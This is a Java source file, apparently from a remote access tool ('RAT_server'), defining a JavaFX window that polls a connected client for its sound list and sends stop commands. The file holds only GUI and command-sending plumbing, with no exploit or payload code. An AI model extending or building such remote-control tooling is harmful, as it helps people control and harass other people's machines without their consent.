package electron.gui;

import java.io.IOException;
import java.net.URL;
import java.util.List;
import java.util.concurrent.locks.LockSupport;

import electron.RAT_server;
import electron.networking.packets.OutputPacket;
import electron.utils.logger;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.ListView;
import javafx.scene.image.Image;
import javafx.stage.Stage;

public class PlayerControls {
	private static boolean isCreated = false;
	@FXML
	private ListView<String> sndList;
	private static ObservableList<String> staticsndList;

	@FXML
	private void initialize() {
		Runnable updateRunnable = new Runnable() {
			@Override
			public void run() {
				while (true) {
					OutputPacket.sendOutPacket("/player soundpacket");
					try {
						Thread.sleep(2000);
					} catch (InterruptedException e) {
						e.printStackTrace();
						isCreated = false;
						logger.log("[electron.gui.PlayerControls]: interrupted update thread.");
						break;
					}
					if (staticsndList.isEmpty() || staticsndList == null || staticsndList.size() == 0) {
						continue;
					}
					Platform.runLater(() -> {
						sndList.setItems(staticsndList);
					});
					if (isCreated == false) {
						logger.log("[electron.gui.PlayerControls]: interrupted update thread.");
						break;
					}
				}
			}
		};
		new Thread(updateRunnable).start();
	}

	@FXML
	private void stopLast() {
		OutputPacket.sendOutPacket("/player stoplast");
	}

	@FXML
	private void stopAll() {
		OutputPacket.sendOutPacket("/player stopall");
	}

	public static void createPlayerUI() {
		if (!isCreated) {
			Platform.runLater(() -> {
				Stage playerStage = new Stage();
				URL url = RAT_server.class.getResource("/resources/playerwindow.fxml");
				logger.log("[Graphics]: loading .fxml config: " + url);
				FXMLLoader loader = new FXMLLoader(url);
				Scene scene;
				try {
					scene = new Scene(loader.load());
					isCreated = true;
					playerStage.setTitle("Internal player");
					playerStage.setScene(scene);
					Image img = new Image(RAT_server.class.getResourceAsStream("/resources/sound.png"));
					playerStage.getIcons().add(img);
					playerStage.show();
					playerStage.setOnCloseRequest((event) -> {
						logger.log("[electron.gui.PlayerControls]: closed window.");
						isCreated = false;
					});
				} catch (IOException e) {
					logger.error("[electron.gui.PlayerControls]: error creating window: " + e.getMessage());
				}
			});
		}
	}

	public synchronized static void updatePlayerList(List<String> sounds) {
		staticsndList = FXCollections.observableArrayList();
		staticsndList.addAll(sounds);
	}

	public static void requestPlayerList() {
		OutputPacket.sendOutPacket("/player soundpacket");
	}
}
